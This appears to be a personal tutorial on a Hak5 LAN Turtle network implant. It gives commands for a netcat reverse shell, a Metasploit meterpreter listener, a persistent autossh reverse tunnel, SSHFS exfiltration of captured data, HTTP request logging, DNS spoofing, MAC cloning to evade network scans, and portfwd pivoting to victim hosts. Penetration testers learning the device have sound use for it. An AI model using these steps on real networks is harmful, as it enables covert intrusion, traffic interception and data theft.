This is a writeup for some of the functionallities for a Lan Turtle from Hack5.

Starting off, just a quick explanation to what a Lan Turtle is, it is two ethernet adapters. If you run an “ifconfig” you will see a “eth0” to “eth1”. There is an ethernet adapter on there, and an ethernet to usb adapter. Essentially, the 

#Shell

One of the basic things is to drop a shell on a network. To do this we will enable the netcat-revshell (NetCat Reverse Shell). There are two types of shells, reverse and bind. The difference is with bind, it listens and you connect to it. With reverse, it broadcasts and you listen for it connects to you. 


To do this I will run a netcat-revshell module. This will run a reverse shell, so we will need to listen to connect to it. To do this, the turtle will have to be on the same vlan as the computer that is listening. You need to the ip and the port that you are going to be listening from. Then run this command to start listening.


```
netcat -l -v -p 8080
```

Netcat - Tool that we are going to be using to connect to the shell

-l - listen flag
-v - verbose flag
-p - port flag (in the example above it’s 8080)

 You will need to configure the module with the ip address and port, then start the module. Then the listener will connect and you will be in.
 
 #DNS Spoof

The first type of attack we will do is a DNS Spoof. Essentially, when a computer needs to resolve a dns name (ie khanacademy.org) it will typically search for a dns server to resolve it. Essentially we will have it use our Lan turtle as a dns server. If it doesn’t have a dns entry for the name, then it will go to the appropriate dns server. It does this since the Lan turtle receives the ip addressing information that is supposed to go to the client, and we issue ip addressing information to the computer. 

We will need to configure the DNSMasq module. Essentially we will need the ip address and url. The entry will be like the one that follows.

```
172.16.84.1 example.com www.example.com  leafy.xyz www.leafy.xyz
```

#Meterpreter Shell 

Another potential shell we could use is Meterpreter. To do this, we will set up a metasploit listener. To do that we will need the ip address of the listener and a port. For the port we will use “4444” and the ip address we will use “172.16.38.140”.

```
use exploit/multi/handler
Set payload php/meterpreter/reverse_tcp
Set LHOST 172.16.38.140
Set LPORT 4444
Exitonsession false
Exploit -j 
```

This will passively run the listener. When you close the session, it will automatically reopen the shell. Now just configure the ip address and port and start it, and enable it. Now the listener should be connected. When you exit the shell or restart the turtle it will open a new session.

This command in metasploit will list all open sessions
```
Sessions
```

This command will connect it to the session with an id of 1
```
Sessions -i 1
```

#Persistent SSH Access

To maintain persistent ssh access, you will need to establish ssh keys. Go into the key manager module, and configure it. First you will need to generate a key. Then you will need to copy that key over to the ssh server you will have access to. To do this, you will need the host, credentials to the user you will be sshing with, and the port.

It will ask you for credentials, and it will take a minute. After that it should go through. After that you can review your keys to see if it worked. Next you have to configure the autossh module. Keep in mind how this module works is it creates a tunnel between the lan turtle and the remote server. Using the keys and the user it will automatically authenticate. This will be a reverse shell.

Now you should just start and enable the module. Enabling it will make it so that it runs whenever it starts up. Keep in mind that the “Auto” in “Autossh” will just work as a frontend to ssh, essentially keeping the connection alive and restarting it if it ever gets interrupted.

Now since hopefully the connection started and is already into your remote server, from your remote server you should just have to use the following command and it should connect you to the lan turtle as root (keep in mind since you’re on the remote host you will need to use the remote port).
```
ssh root@localhost -p 2222
```

Then you should be in. To check run the following command, and you should get the Lan Turtle banner.
```
cat /etc/banner
```

#SSHFS

Storing data locally on the LAN turtle can be a bit cumbersome, and hard to retrieve. Thankfully we can transfer all of the files to our remote server securely using ssh. This will rely on Autossh being configured. To do this, go to the SSHFS module and configure it. You will need to enter in the host ip address and port, the user, and the directory that this will be stored in. You do not need to specify the password due to the ssh keys.

Now once you start the module, any files on the turtle under the “/sshfs/” directory will be transferred to the “/home/turtle” directory on the remote server. This is great for when we have data to dump from a program to the remote server, we can just treat it like a local directory. To test it out just run the following command

On the Lan turtle:
```
echo Hello Jason > /sshfs/hello.txt
```

On the remote server:
```
cat /home/turtle/hello.txt
```

And if the output is “Hello Jason” you know it works.

#URL Snarf

This module really doesn’t have much to it. You configure it to use SSHFS, run it (or enable it your funeral) and it will create a log file back in “/home/turtle/” that will contain all http requests that are passed through the turtle. It will require being in the middle to execute. You can just configure it, and test it to see what it does.

#Clomac
This module will help us stay secret. Thing is, when a network admin that is on the same lan as us runs a scan for mac addresses, he will quickly find that our device doesn’t belong. Running this module will copy the mac address of the machine were connected to so when it checks our device it will essentially not see any difference and move on (also one thing, they typically will scan an ip space, so you will probable want to configure the ip address that your turtle gives to the host machine to be different so scans like that hopefully won’t hit it, otherwise while you are running this module it will see the same device twice)

#Nmap

Since we can have Meterpreter on the Lan turtle, we can use nmap to scan the network, however we need to get a full shell on the turtle. To do this run this command.

```
shell
```

The output should resemble something like “Channel 0 created”. If you want to test it, run this command

```
id
```

And the output should resemble

```
uid=0(root) gid=0(root) groups=0(root)
```

Now to get the shell looking like normal we can get python to spawn a new bash shell by using the following command.

```
python -c ‘import pty;pty.spawn(”/bin/bash”)’
```

Now the shell should look like

```
bash-4.2#
```

Now we are ready to use nmap. To run a quick scan (most common 100 ports) on the 192.168.1 subnet block with a 24 bit subnet mask and have the data sent over to our remote server, run the following command.

```
nmap -F 192.168.1.0/24 > /sshfs/nmap.txt
```

#Metasploit (continued off of Nmap)

Now to run Metasploit. We don't have direct access to the network to run metasploit. However there is an awesome forwarding traffic command “portfwd”. We will need to exit the full shell that we used to run map and return to the meterpreter shell by pressing “Ctrl” + “c”. Once we are back at the meterpreter shell, we can port forward to the system. Let’s say we are exploiting ssh (port 22) on a computer with an ip of 19.168.1.54 and we want to send data to the turtle to port 143, we would use the following command.

```
portfwd add -l 143 -p 22 -r 192.168.1.51
```

So now we can go back to our original metasploit console in Kali, and set the RHost and RPort to the address of the turtle and the port that is being forwarded to the victim. Essentially all this is doing is all traffic the Lan Turtle gets over 143 is being sent to 192.168.1.51 over port 22, so essentially it allows us to run Metasploit on the victim computer through the lan turtle.








